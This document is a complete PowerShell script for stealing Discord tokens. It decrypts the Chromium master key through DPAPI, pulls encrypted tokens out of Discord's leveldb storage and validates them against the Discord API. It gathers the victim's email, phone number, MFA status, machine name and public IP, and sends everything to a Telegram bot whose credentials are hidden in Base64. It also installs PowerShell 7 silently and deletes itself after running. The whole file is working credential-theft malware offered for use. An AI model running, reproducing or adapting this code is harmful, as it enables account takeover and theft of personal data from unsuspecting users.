<#
.SYNOPSIS
    Extracts Discord authentication tokens and sends them to a Telegram chat with enriched metadata.
    • Auto-installs PowerShell 7 if missing, then relaunches itself.
    • Telegram Bot token & chat ID are Base64-obfuscated.
    • -DryRun prints locally; -Preserve skips self-destruct.
    • -Verbose turns on debug output.
#>

[CmdletBinding()]
param(
    [switch]$DryRun,
    [switch]$Preserve
)

#— Base64 credentials —#
$encBot  = 'ODE3MjQ0NzEzMTpBQUZaZkxRMDNBWnk2X2E3S3RZd3F3aE9RQTZ3dnVuWVNvZw=='
$encChat = 'NzI1NTc3NDk3Mw=='
$botToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encBot))
$chatId   = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encChat))

function Invoke-ShadowSetup {
    Write-Verbose "Checking PowerShell version..."
    if ($PSVersionTable.PSVersion.Major -ge 7) { Write-Verbose "PS7+ detected."; return }
    Write-Verbose "Installing PowerShell 7+..."
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        Write-Verbose "Using winget to install..."
        Start-Process winget -ArgumentList 'install','--id','Microsoft.PowerShell','-e','--silent' -Wait
    } else {
        Write-Verbose "Downloading MSI installer..."
        $url = 'https://github.com/PowerShell/PowerShell/releases/latest/download/PowerShell-7.4.5-win-x64.msi'
        $msi = Join-Path $env:TEMP 'pwsh7.msi'
        Invoke-RestMethod -Uri $url -OutFile $msi
        Write-Verbose "Running MSI..."
        Start-Process msiexec.exe -ArgumentList '/i', "`"$msi`"", '/qn' -Wait
        Remove-Item $msi -Force
    }
    $pwsh = (Get-Command pwsh.exe -ErrorAction Stop).Source
    $args = @('-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath)
    if ($DryRun)   { $args += '-DryRun' }
    if ($Preserve) { $args += '-Preserve' }
    Write-Verbose "Relaunching under pwsh: $pwsh $($args -join ' ')"
    & $pwsh @args
    exit
}
Invoke-ShadowSetup

if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
    Write-Error 'Requires PowerShell 7+ on Windows'
    exit 1
}

#— Prep —#
Write-Verbose "Preparing environment..."
$app       = [Environment]::GetFolderPath('ApplicationData')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Security
$dpapi     = [System.Security.Cryptography.ProtectedData]::Unprotect

function Get-CoreKey {
    [CmdletBinding()]
    param([string]$Path)
    Write-Verbose "Reading Local State at $Path"
    $state = Join-Path $Path 'Local State'
    if (-not (Test-Path $state)) { Write-Verbose "No Local State found"; return $null }
    $j = Get-Content $state -Raw | ConvertFrom-Json
    $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
    return $dpapi.Invoke($e[5..($e.Length-1)], $null, 'CurrentUser')
}

function Unwrap-Blob {
    [CmdletBinding()]
    param([byte[]]$Blob, [byte[]]$Key)
    Write-Verbose "Decrypting blob..."
    $iv  = $Blob[3..14]
    $cph = $Blob[15..($Blob.Length-17)]
    $tag = $Blob[($Blob.Length-16)..($Blob.Length-1)]
    $g   = [System.Security.Cryptography.AesGcm]::new($Key)
    $out = New-Object byte[] $cph.Length
    try {
        $g.Decrypt($iv,$cph,$tag,$out)
        return [Text.Encoding]::UTF8.GetString($out).Trim([char]0)
    } catch {
        Write-Verbose "Decryption failed"
        return $null
    }
}

function Seek-Token {
    [CmdletBinding()]
    param([string]$Inst,[byte[]]$Key)
    Write-Verbose "Looking for tokens in $Inst"
    $db = Join-Path $Inst 'Local Storage\leveldb'
    if (-not (Test-Path $db)) { Write-Verbose "No leveldb folder"; return $null }
    $re = [Regex]'dQw4w9WgXcQ:([\w+/=]+)'
    foreach ($f in Get-ChildItem $db -Filter *.ldb -File -Recurse) {
        Write-Verbose "Scanning $($f.Name)"
        $txt = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
        foreach ($m in $re.Matches($txt)) {
            $t = Unwrap-Blob ([Convert]::FromBase64String($m.Groups[1].Value)) $Key
            if ($t) { Write-Verbose "Token found"; return $t }
        }
    }
    return $null
}

function Fetch-User {
    [CmdletBinding()]
    param([string]$Token)
    Write-Verbose "Validating token via /users/@me"
    $h = @{ authorization=$Token }
    try {
        $u = Invoke-RestMethod 'https://discord.com/api/v10/users/@me' -Headers $h -UseBasicParsing -ErrorAction Stop
    } catch {
        Write-Verbose "Token invalid or rate-limited"
        return $null
    }
    return @{
        user   = "$($u.username)#$($u.discriminator)"
        email  = $u.email
        phone  = $u.phone
        mfa    = $u.mfa_enabled
        guilds = (Invoke-RestMethod 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $h -UseBasicParsing).Count
        nitro  = ((Invoke-RestMethod 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $h -UseBasicParsing).Count -gt 0)
    }
}

function Ship-Out {
    [CmdletBinding()]
    param([string]$Src,[string]$Tok)
    $u = Fetch-User -Token $Tok
    if (-not $u) { Write-Verbose "Skipping invalid token"; return }
    Write-Verbose "Building message for $Src"
    $ip      = Invoke-RestMethod 'https://api.ipify.org?format=text' -UseBasicParsing
    $timeStr = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $machine = "$($env:USERNAME) on $($env:COMPUTERNAME)"
    $html = @"
<b>Source:</b> $Src

<b>Token:</b> <code>$Tok</code>

<b>Account:</b> $($u.user)
<b>Email:</b>   $($u.email)
<b>Phone:</b>   $($u.phone)

<b>MFA:</b>     $($u.mfa)
<b>Guilds:</b>  $($u.guilds)
<b>Nitro:</b>   $($u.nitro)

<b>Machine:</b> $machine
<b>IP:</b>      $ip
<b>Time:</b>    $timeStr
"@.Trim()

    if ($DryRun) {
        Write-Host "[DryRun] $html" -ForegroundColor Yellow
    } else {
        Write-Verbose "Sending to Telegram..."
        $body = @{ chat_id=$chatId; text=$html; parse_mode='HTML' } | ConvertTo-Json
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
                          -Method Post -ContentType 'application/json' -Body $body
    }
    if (-not $Preserve) {
        Write-Verbose "Self-destructing script"
        Remove-Item -LiteralPath $PSCommandPath -Force
    }
}

# === Hunt ===
Write-Verbose "Starting search..."
$paths = @("$app\Discord","$app\discordcanary","$app\discordptb","$app\Lightcord")
foreach ($p in $paths) {
    if (-not (Test-Path $p)) { Write-Verbose "No install at $p"; continue }
    $key = Get-CoreKey -Path $p
    if (-not $key) { Write-Verbose "No master key for $p"; continue }
    $tok = Seek-Token -Inst $p -Key $key
    if ($tok) {
        Write-Verbose "Found token, processing..."
        Ship-Out -Src $p -Tok $tok
        break
    }
}

Write-Verbose "Finished." ; if ($DryRun) { Write-Host 'Done.' }
